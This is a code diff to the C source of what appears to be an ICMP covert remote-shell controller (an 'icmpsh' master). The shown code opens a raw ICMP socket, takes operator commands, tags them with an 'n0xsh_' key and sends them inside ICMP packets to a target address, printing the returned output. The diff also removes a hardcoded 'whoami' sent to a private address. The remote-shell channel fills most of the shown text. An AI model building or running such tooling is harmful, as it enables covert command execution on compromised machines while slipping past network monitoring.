@@ -121,7 +121,7 @@ void *Recv(void *lparam){
     struct sockaddr_in addr;
 
 
-    //printf("icmpsh - master\n");
+    
 
     // create raw ICMP socket
     sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
@@ -137,9 +137,6 @@ void *Recv(void *lparam){
 
     //printf("running...\n");
     printf("cmd #\n");
-    //unsigned char command[] = "whoami";
-    //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "hello", 5);
-    //icmp_sendrequest(sockfd, inet_addr("192.168.1.67"), command, sizeof(command));
     while(1) {
 
         // read data from socket
@@ -167,13 +164,9 @@ void *Recv(void *lparam){
                 int result;
                 result = strcmp(buffer, "hello");
                 printf("%s", data);
-                //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "hello", 5);
-                //icmp_sendrequest(sockfd, inet_addr("192.168.1.67"), command, sizeof(command));
+                
 
             }
-        } else{
-            unsigned char command[] = "whoami";
-            icmp_sendrequest(sockfd, inet_addr("192.168.1.9"), command, sizeof(command));
         }
     }
 }
@@ -202,12 +195,11 @@ void *cmd_exec(){
             //printf("COMMANDO: %s", command);
             icmp_sendrequest(sockfd, inet_addr(argip), shell_key_with_command, sizeof(shell_key_with_command));
             icmp_sendrequest(sockfd, inet_addr(argip), shell_key_with_command, sizeof(shell_key_with_command));
-            //printf("key: %s\n", shell_key_with_command);
             memset(command, 0x00, 2048);
             memset(shell_key_with_command, 0x00, 2049);
             strcpy(shell_key_with_command, "n0xsh_");
-            //printf("Key2: %s\n", shell_key_with_command);
-            //printf("cmd $ ");
+            
+            
         } else{
             continue;
         }
@@ -235,13 +227,6 @@ int main(int argc, char **argv)
 
 
 
-    //close(read_pipe[1]);
-    //close(write_pipe[0]);
-    //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "hello", 5);
-    //tell the icmp_recv thread exit ...
-    //close(read_pipe[0]);
-    //close(write_pipe[1])
-    //printf("cmd $ ");
     pthread_t hIcmpRecv;
     pthread_t cmdconn;
     pthread_mutex_init(&g_output_mutex, NULL);
@@ -250,7 +235,7 @@ int main(int argc, char **argv)
     pthread_join(hIcmpRecv, NULL);
     pthread_join(cmdconn, NULL);
     close(sockfd);
-    //cmd_exec();
+
 
 
 
